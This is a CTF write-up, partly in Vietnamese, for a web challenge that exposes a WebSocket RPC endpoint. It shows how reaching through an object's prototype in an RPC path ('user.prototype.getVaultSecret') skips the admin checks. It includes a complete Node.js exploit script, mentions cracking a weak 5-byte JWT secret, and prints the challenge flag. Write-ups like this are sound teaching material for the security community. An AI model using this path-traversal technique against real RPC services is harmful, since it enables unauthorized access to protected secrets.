## web/Pink Black Vault Heist Writeup
### Challenge Description

The Pink Black Bank is the city's most discreet private institution - a 24-karat fortress whose clients prefer their balances stay off-ledger. At its heart sits the Pink Black Vault: a single sealed chamber, opened only by the bank's chief operator, holding fortunes no outsider has ever glimpsed.

### Initial Analysis

Sau khi truy cập website, challenge cho phép:
```
register/login user
load audit log
open vault
```

Tuy nhiên khi dùng tài khoản bình thường và bấm load hoặc open, server trả về:
```
admin access required
```

Điều này cho thấy các action quan trọng yêu cầu quyền admin.

Website sử dụng WebSocket RPC tại endpoint:

`ws://chall.blackpinker.com:20126/rpc`
Inspecting WebSocket Traffic

Sau khi mở DevTools và quan sát WebSocket messages, ta thấy request có dạng:
```
[
  "push",
  [
    "pipeline",
    0,
    ["user","audit"],
    ["JWT_TOKEN"]
  ]
]
```
Điều này cho thấy client đang gọi RPC theo path:

`user.audit(...)`

### Source Code Analysis

Trong source bị leak có class UserApi:
```
class UserApi {
  getVaultSecret() {
    return VAULT_KEY;
  }
}
```
Method `getVaultSecret()` trả trực tiếp `VAULT_KEY`, chính là flag.

Ban tôi nghĩ challenge `intended brute-force JWT` vì source có:

`JWT_SECRET = crypto.randomBytes(5);`

Secret chỉ dài 5 bytes nên hoàn toàn có thể crack bằng hashcat.

Tuy nhiên đó không phải hướng intended.

### The Real Vulnerability

RPC system cho phép traverse object path quá tự do.

Ban đầu thử:

`["user", "getVaultSecret"]`

nhưng server trả:

`'user.getVaultSecret'` is not a function

Nguyên nhân là:

`getVaultSecret()`

không phải static method.

Trong JavaScript, instance methods nằm trong:

UserApi.prototype

Do đó path đúng là:

`["user", "prototype", "getVaultSecret"]`

RPC server sẽ resolve thành:

`UserApi.prototype.getVaultSecret()`

và trả về flag mà không cần quyền admin.

### Exploit

Payload RPC:

`["push",["pipeline",0,["user","prototype","getVaultSecret"],[]]]`

Sau đó gửi:

`["pull",1]`

Server sẽ trả về `VAULT_KEY`.

### Full Exploit Script
```
const WebSocket = require("ws");

const TARGET = "ws://chall.blackpinker.com:20126/rpc";

let id = 1;
const pending = new Map();

function decode(value) {
  if (Array.isArray(value)) {
    if (value.length === 1 && Array.isArray(value[0])) {
      return value[0].map(decode);
    }

    if (value[0] === "undefined") return undefined;
    if (value[0] === "error") return new Error(value[2] || value[1]);
    if (value[0] === "date") return new Date(value[1]);
    if (value[0] === "bigint") return BigInt(value[1]);

    return value.map(decode);
  }

  if (value && typeof value === "object") {
    const obj = {};

    for (const key of Object.keys(value)) {
      obj[key] = decode(value[key]);
    }

    return obj;
  }

  return value;
}

function rpc(ws, path, args = []) {
  const curId = id++;

  return new Promise((resolve, reject) => {
    pending.set(curId, { resolve, reject });

    ws.send(
      JSON.stringify([
        "push",
        ["pipeline", 0, path, args]
      ])
    );

    ws.send(
      JSON.stringify([
        "pull",
        curId
      ])
    );
  });
}

const ws = new WebSocket(TARGET);

ws.on("open", async () => {
  try {
    console.log("[+] Connected");

    const version = await rpc(
      ws,
      ["system", "version"]
    );

    console.log("[+] Version:", version);

    const flag = await rpc(
      ws,
      ["user", "prototype", "getVaultSecret"]
    );

    console.log("[+] FLAG:", flag);

  } catch (err) {
    console.error(
      "[-]",
      err.message || err
    );
  } finally {
    ws.close();
  }
});

ws.on("message", (data) => {
  let msg;

  try {
    msg = JSON.parse(data.toString());
  } catch {
    return;
  }

  if (!Array.isArray(msg)) return;

  const [type, msgId, body] = msg;

  if (
    type === "resolve" ||
    type === "reject"
  ) {
    const handler = pending.get(msgId);

    if (!handler) return;

    pending.delete(msgId);

    const result = decode(body);

    if (type === "resolve") {
      handler.resolve(result);
    } else {
      handler.reject(
        result instanceof Error
          ? result
          : new Error(String(result))
      );
    }
  }
});
```
### Running the Exploit
Chạy exploit:
![Running the Exploit](https://lh3.googleusercontent.com/u/0/d/1zd5Rqo3lSWmyVQ0DMp-1FrGxKoPhf08a)
Flag: `HCMUS-CTF{wh4t_4_5cr4ppy_v4ult_pr0t0typ3!!}`